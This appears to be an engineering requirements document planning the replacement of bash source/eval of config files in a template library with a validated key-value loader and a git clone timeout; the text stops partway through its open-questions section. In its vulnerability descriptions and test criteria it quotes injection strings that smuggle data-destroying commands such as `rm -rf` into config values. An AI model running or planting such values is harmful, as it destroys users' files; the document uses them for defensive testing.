---
prd:
  number: 256
  topic: source-pattern-hardening
  created: 2026-05-04
  status: Approved with Concerns
  type: feature
triad:
  pm_signoff: {agent: product-manager, date: 2026-05-04, status: APPROVED, notes: "v1.1 final. Authored as BLP-02 Wave 2 follow-on to F-1 (#248) closure. 5 vuln_ids (2 HIGH + 2 MEDIUM + 1 LOW) bundled into one architectural pass establishing read-buffer → strict-KV-regex → printf-v as canonical config-loading primitive. New library `template-config-load.sh` exposing `aod_template_load_kv_file`; refactor of 4 source/eval sites + clone timeout watchdog. v1.0 Pass 1 surfaced 3 BLOCKING (Architect) + 2 HIGH (Team-Lead); v1.1 addressed all 3 BLOCKING (B-1 regex `*` not `+`; B-2 Path R-2 writer escape pass removal; B-3 line iteration mechanism + CRLF + leading-whitespace) + all 4 HIGH + 5/5 MEDIUM + 3/3 LOW (Architect) and Stream resizing (Team-Lead). Q-1..Q-6 all adjudicated and folded in. Pass 1.5 Architect APPROVED 2026-05-04 (all BLOCKING resolutions MATCH framing). Single-PR bundle with Day-5 conversion-lever; 9.5d active / 11d hard ceiling preserved (2026-05-05 → 2026-05-19)."}
  architect_signoff: {agent: architect, date: 2026-05-04, status: APPROVED, notes: "Pass 1.5 (v1.1): All 3 Pass 1 BLOCKING resolutions MATCH framing. B-1 regex uses `*` quantifier (line 444); Test-1 case 18 has empty-value PASS. B-2 Path R-2 chosen — escape pass removal + F-1 prompt validator amendment + CHANGELOG note all coordinated. B-3 explicit while-read mechanism with CRLF strip + leading-whitespace path-a; Test-1 cases 19-23. All 4 HIGH folded in (H-1 lower-mode regex + defensive identifier check; H-2 TOCTOU residual race window in ADR + FR-1; H-3 function name aod_template_write_version_file:485-515 corrected throughout; H-4 :558 no-`:-` semantics). Q-1..Q-6 all in new \"Open Question Resolutions (v1.1)\" section. Pass 1 (v1.0): 3 BLOCKING + 4 HIGH + 5 MEDIUM + 3 LOW. Full reviews: .aod/results/architect.md."}
  techlead_signoff: {agent: team-lead, date: 2026-05-04, status: APPROVED_WITH_CONCERNS, notes: "Pass 1 (v1.0): 0 BLOCKING + 2 HIGH + 6 MEDIUM + 3 LOW. Stream 1 +0.5d (library bring-up); Stream 2 +0.5-0.75d (4 sites not equal-effort); Stream 3 -0.25-0.5d (compressed via FR-7 alternatives pre-enumeration). Buffer floor 12.5% (1.5d on 9.5d active); 11d hard ceiling preserved via Day-5 conversion-lever (4 conditions; 3 recovery levers — split, drop key_case, drop clone timeout). Q-4 → Option (a) sibling file `.aod/scripts/bash/template-config-load.sh` (concur with Architect); Q-5 → tiered ladder (≤5%/5-25%/25-50%/>50%) with per-file delta + 100×p50/p95 methodology; Q-1 timeline-angle → single-PR bundle is faster by ~4d than split. Day-8 secondary checkpoint Wed 2026-05-13. Resource: senior-backend-engineer single-agent-interleaved cadence. Full review: .aod/results/team-lead.md."}
source:
  idea_id: 256
  story_id: null
---

# F-2 — Source-Pattern Hardening: Product Requirements Document

**Status**: Approved with Concerns (v1.1 final — Pass 1.5 Architect APPROVED, Team-Lead APPROVED_WITH_CONCERNS Pass 1, PM APPROVED. v1.1 addressed all 3 Pass 1 BLOCKING + 4 HIGH + 5 MEDIUM + 3 LOW from Architect plus 2 HIGH + 6 MEDIUM + 3 LOW from Team-Lead.)
**Created**: 2026-05-04
**Author**: product-manager
**Reviewers**: architect (APPROVED Pass 1.5), team-lead (APPROVED_WITH_CONCERNS Pass 1)
**Phase**: BLP-02 Wave 2 — second feature in the 5-feature enterprise hardening initiative; depends on F-1 (#248) which delivered 2026-05-04
**Priority**: P1 (ICE 22 — I:8 C:7 E:7)

---

## 📋 Executive Summary

### The One-Liner

Eliminate every bash `source`/`eval` of attacker-controllable config-file content across four call sites in tachi's bash library — by introducing a single hardened primitive (`aod_template_load_kv_file`) that does **read-buffer → strict-KV-regex → `printf -v` assignment** — and bundle a portable `git clone` timeout into the same surface, closing five `/security` vulnerabilities (2 HIGH + 2 MEDIUM + 1 LOW) in one coherent PR with public ADR-040 and a release-please trigger.

### Problem Statement

F-1 (#248) closed the substitution-surface side of Daniel Wood's 2026-05-02 LinkedIn note. The 2026-05-02 `/security` scan that grounded BLP-02 surfaced a parallel, equally-load-bearing class of finding: **bash `source` (and the related dynamic-assignment `eval`) of files whose content is treated as code-by-language-semantics, with no pre-execution validation pass**. The five findings cluster into one coherent posture surface — the **config-file load path** — and unlike F-1's substitution surface, this one currently has **no canonical safe primitive in tachi's bash library**. Each call site invented its own ad-hoc validation (or no validation at all):

1. **TACHI-VULN-6f5a95085056 (HIGH, A03 Injection)** — `scripts/init.sh:106` runs `source "stacks/$SELECTED_PACK/defaults.env"` against unsigned bash code shipped inside a stack pack. Stack packs are the documented extension point for tachi adopters; a contributed pack from the community (or a tampered checkout) can place arbitrary bash in `defaults.env` and have it execute at init time with the user's full shell environment. The current contract on `defaults.env` is "should be `KEY=value` lines" — a comment, not an enforcement. There is **zero** validation pass between `cat defaults.env` and `bash` interpreting it. The seed brief's reference to line 69 reflects the pre-F-1 line numbering; F-1 added a ~26-line helper-source preamble, shifting the call to **line 106** in current `main`.

2. **TACHI-VULN-bf5496e9fcdf (HIGH, A03 Injection)** — `.aod/scripts/bash/template-git.sh:561` runs `source "$path"` against `.aod/aod-kit-version` **before** the per-field regex validators at lines 568+ get a chance to run. The validators check `version`, `sha`, `updated_at`, `upstream_url`, `manifest_sha256` shapes — but only **after** bash has already executed whatever `aod-kit-version` contained. Multi-hop chain: `/aod.update` runs weekly (per consumer guide); a corrupted `aod-kit-version` (partial fetch, disk corruption, supply-chain compromise of the upstream tag) with a single line like `version='1.0'; rm -rf ~/Projects` executes the rm before the validator sees `version` failed shape. A second source-before-validate call exists at `template-git.sh:501` inside `aod_template_write_version_file`'s inner round-trip block at `:485-515` (per H-3 correction — v1.0 incorrectly named `aod_template_validate_version_content`, a function that does not exist on `main`) — same class.

3. **TACHI-VULN-9a7512071b4a (MEDIUM, A03 Injection)** — `.aod/scripts/bash/template-substitute.sh:249` runs `eval "AOD_PERSONALIZATION_${key}=\"\$val\""` to dynamically assign per-canonical-key variables. Two related sites at `:217` (read-side indirect lookup `eval "val=\"\${$key:-}\""`) and `:536` / `:558` (write-side equivalents in `aod_template_init_personalization`). Each `eval` re-parses its argument string as bash, meaning if a `$key` ever flows from anywhere except the literal canonical-12 array, an attacker controls a substring of evaluated bash. The *current* call paths source `$key` from `AOD_CANONICAL_PLACEHOLDERS` (literal, hardcoded) so the residual exploitability is low — but the **language-level affordance** that `eval` gives an attacker is unbounded, and any future refactor (e.g., reading canonical placeholders from a config file, which is exactly what F-2 is trying to enable) immediately weaponizes the pattern. The seed brief lists `:224, :511, :533` reflecting earlier line numbers; current verified positions are **`:217, :249, :536, :558`** in `template-substitute.sh` HEAD post-F-1.

4. **TACHI-VULN-4dc6cf8f88ea (MEDIUM, A03 Injection)** — `.aod/scripts/bash/template-substitute.sh:162-209` (`aod_template_load_personalization_env`) implements a **subshell-validate-then-caller-source** pattern: lines 187-191 source the file into a discarded subshell to "sanity-check" it parses; line 209 then sources the *same path* a second time into the caller's scope. This is a textbook TOCTOU (time-of-check-to-time-of-use) — between the subshell read and the caller-scope read, an attacker with write access to `.aod/personalization.env` (or anyone exploiting a race against `init.sh` writing the file) can swap content and have the malicious version execute in caller scope while the validation passed against the benign one. The validation that does happen (newline rejection at `:228-232`, NUL rejection elsewhere) runs **after** the second source — too late to block code execution.

5. **TACHI-VULN-851fd6a21ba9 (LOW, Availability)** — `.aod/scripts/bash/template-git.sh:102-104` runs `git clone --depth=1 ... "$url" "$destdir"` with no timeout. If the upstream remote hangs (DNS resolves but TCP doesn't, or HTTPS handshake stalls), `/aod.update` blocks indefinitely. In a CI runner, this consumes the runner's wall-clock budget; in interactive use, it freezes the agent session. Bundled in F-2 because it lives in `template-git.sh` which is being touched anyway for the `source aod-kit-version` fix — coherent surface, single PR.

The cross-cutting theme: **all four `source`/`eval` sites execute attacker-controlled bash if the underlying file is tampered with, and the repository has no canonical hardened primitive any of them can adopt**. F-1 had `aod_template_substitute_placeholders` waiting in-repo and the work was adoption. F-2 must **build the primitive first**, then adopt it across the surface — substantially larger scope than F-1, with proportionally more test surface, but the same architectural shape: one canonical pattern, one ADR, one squash-merge, one release-please trigger.

This PRD is the **second feature of BLP-02 (Enterprise Hardening Initiative)** — the same blueprint that opened 2026-05-02 in response to Daniel Wood's LinkedIn note. F-1 demonstrated the closed-loop posture-response cadence (LinkedIn → /security → BLP → ADR → release → public artifact); F-2 demonstrates that the cadence holds for **larger, library-introducing** features, not just refactor-to-existing-helper features.

### Proposed Solution

This feature ships as **one feature branch, one squash-merged PR, one `feat(256):` commit subject** that triggers a release-please PR. Six coordinated work items, one new sourced-helper file, no `finding.yaml` schema bump, no orchestrator phase additions:

1. **New library: `aod_template_load_kv_file` (the canonical config-load primitive).** A new sourced file `.aod/scripts/bash/template-config-load.sh` exposes one function: `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>]`. Behavior:
   - **Read once into buffer**: `local content; content=$(cat "$path")` — eliminates the TOCTOU window between any check and any subsequent read.
   - **Validate every line**: each line matched against the strict regex `^[A-Z_][A-Z_0-9]*=("[^"$\\\`]*"|'[^']*'|[A-Za-z0-9._/:@+=-]+)$` (anchored; key uppercase + underscore + digit; value either double-quoted-without-metachars, single-quoted-anything, or unquoted-allowlisted-charset).
   - **Fail-fast on any malformed line**: returns exit code **8** with `[aod] ERROR: malformed line N in <path>: <truncated 80-char content>`. No partial assignment; no caller-scope mutation if any line fails.
   - **Assign via `printf -v` on clean parse**: `printf -v "${var_prefix}${KEY}" '%s' "$VALUE"` (NOT eval). Bash 3.2 compatible.
   - **Optional whitelist**: 3rd arg is the *name* of a bash array variable holding the allowed keys; lines whose KEY is not in the whitelist are rejected with the same exit-8 error.
   - **No bash interpretation of file content at any point.** The file is data, not code. This is the architectural inversion the surface needs.

2. **Refactor site A — `init.sh:106` stack-pack defaults.env (closes TACHI-VULN-6f5a95085056 HIGH).** Replace `source "stacks/$SELECTED_PACK/defaults.env"` with:
   ```bash
   STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)
   aod_template_load_kv_file "stacks/$SELECTED_PACK/defaults.env" "STACK_" STACK_PACK_ALLOWED_KEYS
   ```
   Result: `STACK_TECH_STACK`, `STACK_TECH_STACK_DATABASE`, etc. populated in caller scope; any unknown key (e.g., a contributed pack adding `CUSTOM_HOOK="$(rm -rf /)"`) rejected exit 8.

3. **Refactor site B — `template-git.sh:561` aod-kit-version (closes TACHI-VULN-bf5496e9fcdf HIGH).** Replace the `source "$path"` at `aod_template_read_version_file:561` with `aod_template_load_kv_file "$path" "" "" lower` (no whitelist + lowercase mode per Q-2.5 — version files have a known-set of fields and the per-field regex validators at `:568+` already exist; they run AFTER load and provide stronger field-shape checking than a generic whitelist would). Same applies to `aod_template_write_version_file:485-515` (inner round-trip block at `:501`, **per H-3 correction** — the v1.0 function-name `aod_template_validate_version_content` was incorrect; it does not exist on `main`) — the parallel `source "$tmp_path" 2>/dev/null` becomes a `aod_template_load_kv_file` call (lowercase mode), and the missing-field detection moves into the existing post-load validator chain.

4. **Refactor site C — `template-substitute.sh:217, :249, :536, :558` eval-based dynamic assignment (closes TACHI-VULN-9a7512071b4a MEDIUM).** Replace each `eval "AOD_PERSONALIZATION_${key}=\"\$val\""`-class invocation with `printf -v "AOD_PERSONALIZATION_${key}" '%s' "$val"` and each `eval "val=\"\${$key:-}\""`-class lookup with bash 3.2-compatible indirect expansion via a temporary nameref-equivalent (e.g., `eval` is the existing pattern *because* bash 3.2 lacks `declare -n` namerefs; the intermediate is `local var_name="AOD_PERSONALIZATION_${key}"; val="${!var_name:-}"` — `${!var}` indirect expansion IS bash 3.2 compatible for scalars). Net: zero `eval` invocations in `template-substitute.sh` post-merge.

5. **Refactor site D — `template-substitute.sh:162-209` TOCTOU on personalization.env (closes TACHI-VULN-4dc6cf8f88ea MEDIUM).** Replace `aod_template_load_personalization_env`'s subshell-validate-then-caller-source double-read with a single call to `aod_template_load_kv_file "$path" "AOD_PERSONALIZATION_" AOD_CANONICAL_PLACEHOLDERS`. The existing newline / NUL validation moves into the new loader's regex (the regex's `("[^"$\\\`]*"|'[^']*'|[A-Za-z0-9._/:@+=-]+)` value class implicitly excludes literal newlines and NUL). Existing missing-key detection happens via the whitelist behavior (any canonical key absent → exit 8 with the missing-key list).

6. **Clone timeout — `template-git.sh:102-104` `aod_template_fetch_upstream` (closes TACHI-VULN-851fd6a21ba9 LOW).** Wrap the `git clone` invocation in a portable bash background+kill pattern. Default 60 seconds; override via env var `AOD_FETCH_TIMEOUT` (positive integer seconds). On timeout: kill the clone PID; `rm -rf` the partial checkout; return exit **9**. Bash 3.2 compatible — works without GNU coreutils `timeout(1)`. Pattern sketch:
   ```bash
   git clone ... &
   local clone_pid=$!
   ( sleep "${AOD_FETCH_TIMEOUT:-60}" && kill -TERM "$clone_pid" 2>/dev/null ) &
   local watchdog_pid=$!
   wait "$clone_pid"; clone_rc=$?
   kill "$watchdog_pid" 2>/dev/null
   ```

**Three things this feature is deliberately NOT:**

1. It is **not** a generalized config-format migration. The scope is the four named `source`/`eval` call sites + the one clone site. Adopters keep writing `KEY=value` files; no JSON, no TOML, no YAML — those alternatives are documented in ADR-040 §Alternatives Considered as **rejected**, with rationale (bash 3.2 compatibility, zero new runtime deps, adopter familiarity, contracts/personalization-schema.md continuity).

2. It is **not** a substitution-surface change. F-1 (#248) closed substitution; F-2 closes config-load. The two surfaces share the validation triplet pattern (regex-validate → reject-on-mismatch → `printf -v` assignment) documented in ADR-038 — but F-2 builds the **non-interactive file-parse** version of the pattern (F-1's `aod_init_read_validated` is interactive `read -p` only). Per F-1's PRD §Dependencies-Downstream and Team-Lead Pass 1 H-2 framing: F-2 reuses **the pattern**, not the function.

3. It is **not** a `finding.yaml` or `taxonomy/*.yaml` schema change. BLP-02 closes posture findings against tachi-the-template; the BLP-01 detection-tier contract is preserved. **Ninth feature in a row with zero `finding.yaml` shape change.**

### Success Criteria

#### Vulnerability closure (5 of 5 — primary)

- **SC-1** — All five vuln_ids transition `DETECTED → REMEDIATED` in `.security/vulnerabilities.jsonl` with timestamps and the merging commit SHA recorded:
  - TACHI-VULN-6f5a95085056 (HIGH — `source defaults.env`)
  - TACHI-VULN-bf5496e9fcdf (HIGH — `source aod-kit-version` before validation)
  - TACHI-VULN-9a7512071b4a (MEDIUM — eval-based dynamic assignment)
  - TACHI-VULN-4dc6cf8f88ea (MEDIUM — TOCTOU on personalization.env)
  - TACHI-VULN-851fd6a21ba9 (LOW — git clone no timeout)
- **SC-2** — Post-merge `/security` re-scan against `main` HEAD produces zero new findings within the source-pattern surface this feature touched (`scripts/init.sh`, `.aod/scripts/bash/template-git.sh`, `.aod/scripts/bash/template-substitute.sh`, `.aod/scripts/bash/template-config-load.sh`).

#### Config-load primitive correctness

- **SC-3** — `.aod/scripts/bash/template-config-load.sh` exposes `aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]` with the regex-validate → reject-on-mismatch → `printf -v` assignment behavior specified in FR-1. No `eval` in the function body. The 4th-arg `<key_case>` parameter accepts `upper` (default) and `lower` ONLY (per Q-2.5 ruling).
- **SC-4** — All four `source`/`eval`-config-load sites use `aod_template_load_kv_file`:
  - `init.sh:106` (defaults.env, with `STACK_PACK_ALLOWED_KEYS` whitelist; upper-case mode).
  - `template-git.sh:561` (aod-kit-version primary read, no whitelist; lowercase mode per Q-2.5) and `aod_template_write_version_file:485-515` (inner round-trip block at `:501`, lowercase mode; per H-3 correction).
  - `template-substitute.sh:162-209` (personalization.env, with `AOD_CANONICAL_PLACEHOLDERS` whitelist; upper-case mode).
- **SC-5** — Zero `eval` invocations remain in `.aod/scripts/bash/template-substitute.sh` after the refactor. Verified via `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` returning `0`.

#### Adversarial-input rejection (defense-in-depth)

- **SC-6** — Each of the four refactored sites accepts a malformed-input fixture and exits with code 8 + a clear error naming the line number and offending content. Adversarial cases include (per Test-2 enumeration): shell metachar in unquoted value (e.g., `KEY=foo;rm -rf /`), unbalanced quote, `KEY=` followed by `$(...)` command substitution, KEY with lowercase, missing whitelisted key, line with only KEY and no `=`, value with embedded literal newline, value with embedded NUL.
- **SC-7** — No silent execution: a fixture containing `version='1.0'; touch /tmp/F-256-pwned` placed at `.aod/aod-kit-version` is rejected exit 8 with no `/tmp/F-256-pwned` ever created.

#### Clone timeout correctness

- **SC-8** — `aod_template_fetch_upstream` against a fixture upstream that intentionally hangs (test fixture: a local TCP listener that accepts but never responds) times out at the configured `AOD_FETCH_TIMEOUT` (default 60s; test uses 3s for fast CI). Partial checkout is cleaned up (`destdir` does not exist post-failure). Function returns exit code **9**.
- **SC-9** — `AOD_FETCH_TIMEOUT` override is respected: `AOD_FETCH_TIMEOUT=5 aod_template_fetch_upstream ...` against the hanging fixture times out at ~5s, not 60s.

#### Performance benchmark contract (per F-1 H-2 precedent)

- **SC-10** — Stream 1 includes a benchmark of the new `aod_template_load_kv_file` path against the pre-F-2 `source` path on the canonical fixture (the four real config files in tachi: `stacks/nextjs-supabase/defaults.env`, `stacks/fastapi-react/defaults.env`, a recorded-valid `aod-kit-version`, a recorded-valid `personalization.env`). Both timings recorded in ADR-040 §Consequences.

  **Benchmark methodology (per M-4 + Q-5 ruling)**:
  - **Sample size**: 100 invocations per fixture file; report median (p50) AND 95th percentile (p95).
  - **Scope**: function-call execution only; library-source cost (the cost of `source .aod/scripts/bash/template-config-load.sh` at startup) is a separate startup-cost line item (sub-millisecond, not regression-relevant).
  - **Cache state**: report warm-cache (typical interactive use) AND cold-cache (CI runner state) numbers separately. F-250's ADR-039 sets the precedent for cache-state-aware reporting.
  - **Threshold computation**: per-file delta, NOT aggregate. A 100% slowdown on one file averaged with 0% on three others would mask the regression. Compute delta as `(new p50 - old p50) / old p50`; round to 1 decimal place.

  The new parser is **expected to be slower than `source`** because it reads + validates instead of letting bash interpret directly. Threshold ladder (mirrors F-1's NFR-4 with Q-5 refinements):
  - **If delta ≤ 5%**: NFR-4 holds at 10%; document in ADR-040 §Consequences. No PRD update needed.
  - **If delta is 5% to 25%**: ADR-040 documents the actual delta; NFR-4 loosens to 25% with rationale (the security improvement justifies a constant-factor cost on a bounded-size config file). Architect approval recorded in ADR-040 (record-only escalation; no Team-Lead gate).
  - **If delta is 25% to 50%**: Accept-and-document (Q-5 Option a, tightened) — loosen NFR-4 to 50%; ADR-040 §Consequences MUST include both raw numbers AND a statement of why the security improvement justifies the cost on bounded-size files. Team-Lead approval recorded in spec.md.
  - **If delta is >50%**: spec author **escalates to PM for re-scope** (Q-5 Option c). Three re-scope levers: (i) Q-1 split — ship F-2a (library + 2 sites), defer F-2b; (ii) drop the whitelist enforcement (loses defense-in-depth); (iii) accept >50% with explicit security tradeoff in ADR-040 + CHANGELOG.

  **Awk micro-optimization REJECTED (per Q-5 ruling)**: PRD draft floated `awk -F=` or precompiled-regex micro-optimization as a 0.5d-add. RULED OUT for two reasons: (1) BSD awk (default on macOS) and GNU awk have different feature sets; introduces external-tool variance contradicting F-1's "no GNU coreutils dependency" precedent. (2) Complexity creep on a security-load primitive that must be audit-readable. If micro-optimization becomes necessary in future, ships in a follow-on feature with its own ADR amendment, not in F-2.

#### ADR + governance + release-trigger

- **SC-11** — Public ADR-040 *"Config File Parsing Hardening"* is authored in `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md` documenting the read-buffer → strict-regex → `printf -v` pattern, the alternatives considered (JSON config, TOML config, individual point-fixes per site, bash sourcing inside a `set -r` restricted-shell subshell), the bash 3.2 compatibility constraint, and the relationship to ADR-038 (substitution canon). Status: Proposed → Accepted (dual-commit pattern). The split-or-bundle decision (Q-1 below) is documented in spec.md §Format and referenced from ADR-040 §Decision per BLP-02 §F-2 Governance.
- **SC-12** — Triple Triad sign-off recorded on `tasks.md` (PM + Architect + Team-Lead).
- **SC-13** — PR title is Conventional-Commits-formatted as `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout` at draft creation. Belt-and-suspenders release verification per `.claude/rules/git-workflow.md`: post-merge `gh pr list --state open --search "release-please" --limit 3` returns a release-please PR within ~30s; if not, push an empty release-marker commit `feat(256): source-pattern hardening — release marker`.

#### Cross-cutting

- **SC-14** — Zero new runtime dependencies — empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`, or any other dependency manifest.
- **SC-15** — All Regression Protection Plan tests pass on macOS (bash 3.2 default) AND Linux (bash 4+) via the existing pytest CI matrix (per F-1 precedent: pytest-via-subprocess, NOT bats — the matrix is already wired). Test files land at `tests/scripts/test_template_config_load_*.py` consistent with the existing pytest convention.

### Timeline

Target: **9.5 working days** active + 1.5d buffer (P1 priority, single-stream feature, **new library** to build, **larger surface** than F-1 with proportionally more test files). **Hard ceiling: 11 working days.** F-1 was 8d for adoption-of-existing-helper scope; F-2 is +1.5d for library-bring-up + 4-site refactor + benchmark-with-thresholds NFR.

**Calendar binding**:
- **Day 1**: Tue 2026-05-05 (build start)
- **Day 5**: Mon 2026-05-11 EOD (slip-watch checkpoint — see below)
- **Day 8**: Wed 2026-05-13 EOD (secondary checkpoint — see below)
- **Day 9**: Fri 2026-05-15 (target merge)
- **Day 11**: Tue 2026-05-19 (hard ceiling)

The work admits limited parallelism — **library-bring-up (Stream 1)** is the critical path; refactor-site adoption (Stream 2) blocks on Stream 1 landing the library; ADR drafting (Stream 3), clone timeout (Stream 4), and test infrastructure (Stream 5) can advance in parallel.

| Stream | Items | Days | Critical path? |
|---|---|---|---|
| Stream 1: `aod_template_load_kv_file` library + unit tests + `contracts/stack-pack-defaults-schema.md` | SC-3 + L-3 | **2.5d** (per H-1) | YES |
| Stream 2: Refactor 4 call sites — Site A (init.sh:106 defaults.env, 0.5d) + Site B (template-git.sh:561 + write_version_file:485-515 inner round-trip at :501 aod-kit-version, 0.75d; per H-3) + Site C (template-substitute.sh eval removal + writer escape pass removal, 0.5d) + Site D (template-substitute.sh:162 TOCTOU collapse, 0.75-1.0d) | SC-4, SC-5 | **2.5-2.75d** (per H-2) | YES — blocks on Stream 1 |
| Stream 3: ADR-040 + Q-1 documentation + release trigger | SC-11, SC-12, SC-13 | **0.5-0.75d** (per M-5; compressed via FR-7 alternatives pre-enumeration) | NO — independent |
| Stream 4: Clone timeout + watchdog SIGINT trap (per L-1) + test | SC-8, SC-9 | 1.0d | NO — independent of source-load surface |
| Stream 5: Adversarial + cross-platform tests + hanging-listener fixture (0.5d budget per M-3) + post-merge verification | SC-2, SC-6, SC-7, SC-15 + Test-1..Test-7 | 3.0d | YES — depends on Stream 1+2 landing |

**Quantified totals (per M-2)**:
- **Single-agent serial**: 2.5 + 2.75 + 0.75 + 1.0 + 3.0 = **9.75d active**.
- **Single-agent with task interleaving (recommended)**: max(Stream 1 + Stream 2, Stream 3 + Stream 4) + Stream 5 = max(5.25d, 1.75d) + 3.0d = 8.25d + 0.5d context-switch overhead = **8.75d active**.
- **Two-agent parallel (escape hatch only)**: max(Stream 1+2, Stream 3+4) + Stream 5 (partially overlapping) = ~6-7d active. With coordination overhead.

**Recommended cadence**: **single-agent-with-task-interleaving** (BLP-02 pattern). Same agent (`senior-backend-engineer`) drafts the ADR (Stream 3) on Day 1 morning while waiting for the function body's first compile, then implements the function body on Day 1 afternoon, etc. F-1 cadence proven at 200-300 LOC; F-2 at 700-1100 LOC stretches the agent's context-switch budget but is still single-agent-tractable. F-2 has NO external schedule pressure equivalent to F-1's LinkedIn comment binding — single-agent-interleaved is correct unless emergent pressure changes the equation.

**Buffer floor: 12.5%** = 1.5d on 9.5d active = 11d hard ceiling. Hard ceiling preserved at 11d via the **Day-5 slip-watch conversion-lever**, NOT via buffer expansion.

**Reabsorption authority**: Team-Lead retains explicit authority during build to reabsorb Stream 3 (ADR-040 drafting, compressed via FR-7 alternatives pre-enumerated) → Stream 1 (+0.5d per H-1) and Stream 2 (+0.5-0.75d per H-2) if Day-5 checkpoint shows H-1/H-2 sizing slipping. Beyond that scope (e.g., Stream 4 → Stream 5), Team-Lead escalates to PM.

#### Day-5 Slip-Watch Checkpoint (Mon 2026-05-11 EOD)

**Conditions checked at Day 5 EOD**:

1. **Stream 1 unit tests green on macOS bash 3.2.57**: `tests/scripts/test_template_config_load_unit.py` runs via subprocess on macOS-latest CI; ≥17/17 cases pass. **GREEN-LIGHT condition** for Stream 2 to begin in earnest.
2. **Stream 2 Site A green on Linux**: `init.sh:106` refactor implemented; `tests/scripts/test_init_sh_defaults_env.py` Test-4 case 1 (each shipped stack pack loads) passes on ubuntu-latest. **CHECK** — partial credit if at least one stack pack loads cleanly.
3. **ADR-040 draft committed (Status: Proposed)**: `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md` exists on the feature branch with §Context + §Decision + §Alternatives Considered (6 alternatives including new alternative f per M-5) drafted. **GREEN-LIGHT condition** for Stream 3 close-out.
4. **Stream 4 clone timeout: watchdog pattern compiles and unit-runs on macOS bash 3.2**: smoke test against a fast clone (succeeds normally) AND a hanging clone (times out at AOD_FETCH_TIMEOUT=3) on macOS local. **GREEN-LIGHT condition** for Stream 4 → Stream 5 hand-off.

**Slip-watch action if any condition fails**:

- **One condition red**: continue but flag for Day 6 escalation.
- **Two conditions red**: Team-Lead escalates to PM. Recovery levers in priority order:
  1. **Convert to Q-1 split** (F-2a-first): ship library + 2 sites by Day 8; defer F-2b to follow-on PR with own calendar. **Schedule recovery: 3-4d.** This is the explicit Q-1 conversion-lever per Architect ruling.
  2. **Drop Q-2.5 `<key_case>` parameter**: defer the lowercase-key support for `aod-kit-version` to a follow-on; F-2 ships uppercase-only. **Schedule recovery: 0.5d.**
  3. **Drop clone timeout**: defer Stream 4 entirely to a follow-on PR. **Schedule recovery: 1d + 1d test budget.**
- **Three+ conditions red**: this is a structural slip. Escalate to PM immediately; do not attempt to recover within the 11d ceiling.

#### Day-8 Secondary Checkpoint (Wed 2026-05-13 EOD)

- All Stream 1+2 sites refactored + green; Stream 5 tests authored (≥80% case coverage); Stream 3 ADR-040 transitioning to Accepted.
- If Stream 5 isn't green on macOS + Linux by Day 8 EOD, the Day-9 merge target is at risk. Use Day 9 as soak day; merge at Day 10-11 within the hard ceiling.

#### Resource Assignment

**Single agent**: `senior-backend-engineer` (bash + integration test surface; canonical match for `init.sh` + `template-*.sh` library refactors).

**Supporting reviewers**:
- `architect` for Q-1 (split-or-bundle), Q-2 (whitelist policy), Q-2.5 (KEY case), Q-3 (clone timeout default + AOD_FETCH_TIMEOUT=0). Pass 1 review concurrent with Team-Lead.
- `tester` for Stream 5 fixture-design review at Day 4 (one day before slip-watch); Day 5 slip-watch CI matrix verification.
- `security-analyst` for Test-7 post-merge `/security` re-scan + `.security/vulnerabilities.jsonl` REMEDIATED event verification.
- `code-reviewer` for the large-PR review iteration cycle (Day 6-9 — F-2's ~700-1100 LOC PR is past the threshold where a dedicated reviewer adds value vs the agent's own self-review).

---

## 🎯 Open Question Resolutions (v1.1)

All six open questions (Q-1..Q-6) have been adjudicated in Pass 1 reviews and are folded into the v1.1 PRD content. They are recorded here as a closure trail for the spec author. The original Q-1..Q-6 enumerations remain in §Open Questions below with status `RESOLVED` and a pointer to this section.

### Q-1 (Architect Pass 1) — RESOLVED → Single PR by default; F-2a/F-2b split is reserved as Day-5 slip-watch contingency

**Adjudicator**: Architect (Pass 1 review). Team-Lead concurs from schedule angle (single-PR bundle is faster by ~4d than split — 9d vs 13d).
**Decision**: SINGLE PR by default (~700-1100 LOC). F-2a/F-2b split is reserved as the Day-5 slip-watch contingency lever — NOT the default path. ADR-040 §Decision documents the single-PR rationale per BLP-02 §F-2 Governance.
**Rationale**: (1) Architectural coherence — five vulns reduce to one root pattern; splitting muddies the ADR canon. (2) Library-then-adoption sequencing is internal to the feature branch, not PR-boundary. (3) Release-please cadence — single PR matches F-1 demonstrated norm. (4) Schedule angle (Team-Lead) — single-PR bundle is faster by ~4d than split (9d vs 13d when accounting for ADR amendment + double release-please). The Day-5 slip-watch checkpoint provides a deterministic conversion lever if Stream 1 hasn't recorded a green CI matrix run by Day 5 EOD.
**Folded into**: §Format references (Deliverable section), FR-7 (ADR-040 §Decision documents single-PR rationale), Timeline (Day-5 slip-watch with conversion-to-split as lever 1).

### Q-2 (Architect Pass 1) — RESOLVED → Option (b) — Whitelist REQUIRED for `init.sh:106` + `template-substitute.sh:162`; OPTIONAL for `template-git.sh:561/:501`

**Adjudicator**: Architect (Pass 1 review).
**Decision**: Whitelist REQUIRED for `init.sh:106` (defaults.env — highest trust-distance call site, contributed pack content) AND `template-substitute.sh:162` (personalization.env — has the canonical-12 lockstep contract). Whitelist OPTIONAL for `template-git.sh:561/:501` (aod-kit-version — has 5 well-documented fields with per-field regex validators that run after load; whitelist would be defense-in-depth, not load-bearing).
**Rationale**: stack-pack defaults.env has the highest trust-distance (community-contributed); whitelist constrains the allowed-key universe even if values pass the regex. Personalization.env has the canonical-12 lockstep contract — the whitelist IS that contract. Version-file site has lowercase keys + per-field validators that provide stronger field-shape checking than a generic whitelist.
**Folded into**: FR-1 (whitelist behavior), FR-2 (init.sh defaults.env with `STACK_PACK_ALLOWED_KEYS`), FR-3 (aod-kit-version no whitelist + lowercase via `<key_case>` parameter), FR-5 (personalization.env with `AOD_CANONICAL_PLACEHOLDERS`).

### Q-2.5 (Architect Pass 1, follow-up) — RESOLVED → Ship `<key_case>` parameter with values `upper` (default) and `lower` ONLY (NOT `mixed`)

**Adjudicator**: Architect (Pass 1, alongside Q-2).
